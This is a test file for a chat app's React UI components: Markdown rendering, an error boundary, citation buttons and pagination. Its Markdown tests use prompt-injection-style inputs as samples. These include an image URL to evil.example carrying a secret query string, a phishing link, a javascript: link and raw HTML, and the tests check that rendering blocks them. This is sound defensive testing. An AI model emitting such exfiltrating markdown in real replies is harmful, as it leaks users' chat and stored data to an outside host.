import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import { linkCitations, Markdown, Pager, ScreenBoundary, usePaged } from './ui';

// Model output can be steered by a poisoned document (prompt injection), so
// rendering it must never make a network request or navigate (AGENTS.md §9).
describe('Markdown', () => {
  it('never loads remote images: an image URL could carry chat or KB text out', () => {
    const { container } = render(<Markdown text={'![chart](https://evil.example/p.png?q=secret)'} />);
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText(/image blocked/i)).toHaveTextContent('evil.example');
    expect(container.innerHTML).not.toContain('q=secret');
  });

  it('renders links as text with their real host, not as navigable anchors', () => {
    const { container } = render(<Markdown text={'[your bank](https://phish.example/login)'} />);
    expect(container.querySelector('a[href]')).toBeNull();
    expect(screen.getByText('your bank')).toBeInTheDocument();
    expect(screen.getByText('phish.example')).toBeInTheDocument();
  });

  it('copies a link instead of opening it', async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
    render(<Markdown text={'See [docs](https://example.com/a).'} />);
    await userEvent.click(screen.getByRole('button', { name: 'Copy link https://example.com/a' }));
    expect(writeText).toHaveBeenCalledWith('https://example.com/a');
  });

  it('drops javascript: links entirely', () => {
    const { container } = render(<Markdown text={'[x](javascript:alert(1))'} />);
    expect(container.innerHTML).not.toContain('javascript:');
    expect(screen.queryByRole('button', { name: /copy link/i })).toBeNull();
  });

  it('does not render raw HTML from the model', () => {
    const { container } = render(<Markdown text={'<img src="https://evil.example/x.png"><b>hi</b>'} />);
    expect(container.querySelector('img, b')).toBeNull();
  });
});

describe('ScreenBoundary', () => {
  it('shows a render error in place of the screen instead of blanking the window, and retries', async () => {
    vi.spyOn(console, 'error').mockImplementation(() => {});
    let broken = true;
    const Screen = () => {
      if (broken) throw new Error('x.cites is undefined');
      return <p>Chat</p>;
    };
    render(
      <>
        <nav>Sidebar</nav>
        <ScreenBoundary>
          <Screen />
        </ScreenBoundary>
      </>,
    );
    expect(screen.getByRole('alert')).toHaveTextContent('x.cites is undefined');
    expect(screen.getByText('Sidebar')).toBeInTheDocument();
    broken = false;
    await userEvent.click(screen.getByRole('button', { name: 'Try again' }));
    expect(screen.getByText('Chat')).toBeInTheDocument();
    vi.restoreAllMocks();
  });
});

describe('citations', () => {
  it('links [n] within the sources, and leaves code, links and out-of-range numbers alone', () => {
    expect(linkCitations('A [1]. B [2, 3]. C [9]. `x[1]` and\n```\ny[2]\n```\n[see](https://e.x) [1](https://e.x)', 3)).toBe(
      'A [\\[1\\]](#cite-1). B [\\[2\\]](#cite-2)[\\[3\\]](#cite-3). C [9]. `x[1]` and\n```\ny[2]\n```\n[see](https://e.x) [1](https://e.x)',
    );
  });

  it('renders a citation as a button that opens its source, and never navigates', async () => {
    const onCite = vi.fn();
    render(<Markdown text="Use COOP [2]. Plain [5]." sources={3} onCite={onCite} />);
    expect(screen.queryByRole('link')).toBeNull();
    expect(screen.queryByRole('button', { name: 'Source 5' })).toBeNull();
    await userEvent.click(screen.getByRole('button', { name: 'Source 2' }));
    expect(onCite).toHaveBeenCalledWith(2);
  });

  it('keeps model-written #cite links inert without onCite', () => {
    render(<Markdown text="[click](#cite-1)" />);
    expect(screen.queryByRole('button', { name: 'Source 1' })).toBeNull();
  });
});

describe('pagination', () => {
  function List({ items, focus }: { items: string[]; focus?: string }) {
    const paged = usePaged(items, 3, focus ? (x) => x === focus : undefined);
    return (
      <>
        <ul>
          {paged.items.map((x) => (
            <li key={x}>{x}</li>
          ))}
        </ul>
        <Pager paged={paged} label="Things" />
      </>
    );
  }
  const shown = () => screen.queryAllByRole('listitem').map((li) => li.textContent);
  const letters = 'abcdefgh'.split('');

  it('shows one page at a time and steps through them', async () => {
    const user = userEvent.setup();
    render(<List items={letters} />);
    expect(shown()).toEqual(['a', 'b', 'c']);
    const nav = screen.getByRole('navigation', { name: 'Things' });
    expect(nav).toHaveTextContent('1–3 of 8');
    expect(screen.getByRole('button', { name: 'Previous page' })).toBeDisabled();
    await user.click(screen.getByRole('button', { name: 'Next page' }));
    await user.click(screen.getByRole('button', { name: 'Next page' }));
    expect(shown()).toEqual(['g', 'h']);
    expect(nav).toHaveTextContent('7–8 of 8');
    expect(screen.getByRole('button', { name: 'Next page' })).toBeDisabled();
  });

  it('opens on the page of the focused item and follows it', () => {
    const { rerender } = render(<List items={letters} focus="e" />);
    expect(shown()).toEqual(['d', 'e', 'f']);
    rerender(<List items={letters} focus="h" />);
    expect(shown()).toEqual(['g', 'h']);
  });

  it('stays on a page that still exists when the list shrinks, and hides for one page', () => {
    const { rerender } = render(<List items={letters} focus="h" />);
    rerender(<List items={['a', 'b']} />);
    expect(shown()).toEqual(['a', 'b']);
    expect(screen.queryByRole('navigation', { name: 'Things' })).not.toBeInTheDocument();
  });
});
